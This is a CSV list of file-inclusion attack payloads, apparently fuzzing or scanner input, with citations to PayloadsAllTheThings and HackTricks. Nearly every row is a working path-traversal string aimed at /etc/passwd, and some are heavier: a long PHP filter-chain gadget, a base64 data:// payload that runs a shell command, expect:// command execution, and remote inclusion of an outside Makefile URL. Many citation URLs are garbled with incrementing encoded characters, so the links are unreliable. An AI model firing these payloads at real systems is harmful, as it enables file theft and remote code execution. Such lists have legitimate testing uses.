cve,tag,payload,url
,File Inclusion,../../../etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion 
,File Inclusion,../../../etc/passwd%00,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%21Inclusion
,File Inclusion,%252e%252e%252fetc%252fpasswd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%22Inclusion
,File Inclusion,%252e%252e%252fetc%252fpasswd%00,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%23Inclusion
,File Inclusion,%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%24Inclusion
,File Inclusion,%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%25Inclusion
,File Inclusion,....//....//etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%26Inclusion
,File Inclusion,..///////..////..//////etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%27Inclusion
,File Inclusion,/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%28Inclusion
,File Inclusion,https://raw.githubusercontent.com/dg2vy/sum-test/refs/heads/master/Makefile,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%29Inclusion
,File Inclusion,https://raw.githubusercontent.com/dg2vy/sum-test/refs/heads/master/Makefile%00,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%30Inclusion
,File Inclusion,https:%252f%252fraw.githubusercontent.com%252fdg2vy%252fsum-test%252frefs%252fheads%252fmaster%252fMakefile,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%31Inclusion
,File Inclusion,php://filter/read=string.rot13/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%32Inclusion
,File Inclusion,php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%33Inclusion
,File Inclusion,php://filter/convert.base64-encode/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%34Inclusion
,File Inclusion,pHp://FilTer/convert.base64-encode/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%35Inclusion
,File Inclusion,php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%36Inclusion
,File Inclusion,php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%37Inclusion
,File Inclusion,"data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTs/Pg==",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%38Inclusion
,File Inclusion,expect://id,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%39Inclusion
,File Inclusion,expect://cat+/etc/passwd,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%40Inclusion
,File Inclusion,../etc/passwd,x
,File Inclusion,../../etc/passwd,x
,File Inclusion,../../../../etc/passwd,x
,File Inclusion,…/./…/./etc/passwd,x
,File Inclusion,.././.././.././etc/passwd,x
,File Inclusion,"php://filter/convert.base64-decode/resource=data://plain/text,LXMzIwNjYg",https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/file-inclusion/README.md
,File Inclusion,/etc/passwd,x
,File Inclusion,../../../etc/passwd,x
,File Inclusion,/../../../../etc/passwd,x
,File Inclusion,../../../../../../../../../etc/passwd,x
,File Inclusion,../../../../../../../../etc/passwd,x
,File Inclusion,../../../../../../../etc/passwd,x
,File Inclusion,../../../../../etc/passwd,x
,File Inclusion,../../../../../../../../../../../../etc/passwd%00,x
,File Inclusion,/../../../../../../../../../../etc/passwd^^,x
,File Inclusion,/../../../../../../../../../../etc/passwd,x
,File Inclusion,/./././././././././././etc/passwd,x
,File Inclusion,..\..\..\..\..\..\..\..\..\..\etc\passwd%00,x
,File Inclusion,/..\../..\../..\../..\../..\../..\../etc/passwd,x
,File Inclusion,.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd,x
,File Inclusion,\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,x
,File Inclusion,..\..\..\..\..\..\..\..\..\..\etc\passwd%00,x
,File Inclusion,%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd,x
,File Inclusion,%0a/bin/cat%20/etc/passwd,x
,File Inclusion,%00../../../../../../etc/passwd,x
,File Inclusion,/../../../../../../../../../../../etc/passwd%00.jpg,x
,File Inclusion,/../../../../../../../../../../../etc/passwd%00.html,x
,File Inclusion,/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,x
,File Inclusion,%00/etc/passwd%00,x
,File Inclusion,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,x
,File Inclusion,\\&apos;/bin/cat%20/etc/passwd\\&apos;,x
,File Inclusion,/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,x
,File Inclusion,/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,x
,File Inclusion,/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,x
,File Inclusion,/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,x
,File Inclusion,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',x
,File Inclusion,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd,x
,File Inclusion,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd,x
,File Inclusion,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd,x
